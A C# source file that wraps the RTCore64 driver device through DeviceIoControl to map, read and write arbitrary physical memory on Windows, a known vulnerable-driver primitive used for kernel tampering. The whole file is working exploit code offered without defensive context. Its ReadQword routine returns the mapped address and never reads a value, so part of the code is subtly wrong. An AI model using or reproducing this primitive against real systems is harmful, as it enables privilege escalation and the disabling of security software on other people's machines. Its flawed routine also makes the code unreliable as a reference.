using System.Runtime.InteropServices;

namespace te;

public class msi
{
    
    public static byte ReadByte(IntPtr h, ulong physAddr)
    {
        var mapped = MapPhysicalAddress(h, physAddr);
        var v = ReadMappedMemory(h, mapped, 0, 1);
        return (byte)v;
    }

    public static ushort ReadWord(IntPtr h, ulong physAddr)
    {
        var mapped = MapPhysicalAddress(h, physAddr);
        var v = ReadMappedMemory(h, mapped, 0, 2);
        return (ushort)v;
    }

    public static uint ReadDword(IntPtr h, ulong physAddr)
    {
        var mapped = MapPhysicalAddress(h, physAddr);
        return ReadMappedMemory(h, mapped, 0, 4);
    }

    public static ulong ReadQword(IntPtr h, ulong physAddr)
    {
        var mapped = MapPhysicalAddress(h, physAddr);
        return mapped;
    }


    public static void WriteByte(IntPtr h, ulong physAddr, byte value)
    {
        var mapped = MapPhysicalAddress(h, physAddr);
        WriteMappedMemory(h, mapped, 0, 1, value);
    }

    public static void WriteWord(IntPtr h, ulong physAddr, ushort value)
    {
        ulong mapped = MapPhysicalAddress(h, physAddr);
        WriteMappedMemory(h, mapped, 0, 2, value);
    }

    public static void WriteDword(IntPtr h, ulong physAddr, uint value)
    {
        ulong mapped = MapPhysicalAddress(h, physAddr);
        WriteMappedMemory(h, mapped, 0, 4, value);
    }

    public static void WriteQword(IntPtr h, ulong physAddr, ulong value)
    {
        ulong mapped = MapPhysicalAddress(h, physAddr);

        uint low = (uint)(value & 0xFFFFFFFF);
        uint high = (uint)(value >> 32);

        WriteMappedMemory(h, mapped, 0, 4, low);
        WriteMappedMemory(h, mapped, 4, 4, high);
    }


    public static IntPtr OpenRtCore()
    {
        const uint genericRead = 0x80000000;
        const uint genericWrite = 0x40000000;
        const uint openExisting = 3;

        var h = CreateFile(
            @"\\.\RTCore64",
            genericRead | genericWrite,
            0,
            IntPtr.Zero,
            openExisting,
            0,
            IntPtr.Zero);
        
        return h;
    }

    static void WriteMappedMemory(IntPtr hDevice, ulong mappedAddr, uint offset, uint sizeType, uint value)
    {
        var s = new RtCore64Struct { Unknown3 = new byte[16] };

        s.MappedAddress = mappedAddr;
        s.Offset = offset;
        s.SizeType = sizeType;
        s.Output = value;

        uint bytes;
        var ok = DeviceIoControl(
            hDevice,
            0x8000204C,
            ref s,
            48,
            ref s,
            48,
            out bytes,
            IntPtr.Zero);

        if (!ok)
            throw new Exception("WriteMappedMemory failed: " + Marshal.GetLastWin32Error());
    }

    static ulong MapPhysicalAddress(IntPtr hDevice, ulong physAddr)
    {
        var s = new RtCore64Struct { Unknown3 = new byte[16] };

        s.MappedAddress = physAddr;

        uint bytes;
        bool ok = DeviceIoControl(
            hDevice,
            0x80002040,
            ref s,
            48,
            ref s,
            48,
            out bytes,
            IntPtr.Zero);
        
        return s.MappedAddress;
    }

    static uint ReadMappedMemory(IntPtr hDevice, ulong mappedAddr, uint offset, uint sizeType)
    {
        var s = new RtCore64Struct { Unknown3 = new byte[16] };

        s.MappedAddress = mappedAddr;
        s.Offset = offset;
        s.SizeType = sizeType;

        var ok = DeviceIoControl(
            hDevice,
            0x80002048,
            ref s,
            48,
            ref s,
            48,
            out _,
            IntPtr.Zero);
        

        return s.Output;
    }


    [StructLayout(LayoutKind.Sequential, Size = 48)]
    public struct RtCore64Struct(byte[] unknown3)
    {
        public uint Unknown0; // 0x00
        public uint Unknown1; // 0x04

        public ulong MappedAddress; // 0x08  <-- 映射后的虚拟地址（由 0x80002040 填充）

        public uint Unknown2; // 0x10
        public uint Offset; // 0x14
        public uint SizeType; // 0x18
        public uint Output; // 0x1C

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public byte[] Unknown3 = unknown3; // 0x20
    }




    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool DeviceIoControl(
        IntPtr hDevice,
        uint dwIoControlCode,
        ref RtCore64Struct lpInBuffer,
        int nInBufferSize,
        ref RtCore64Struct lpOutBuffer,
        int nOutBufferSize,
        out uint lpBytesReturned,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);
}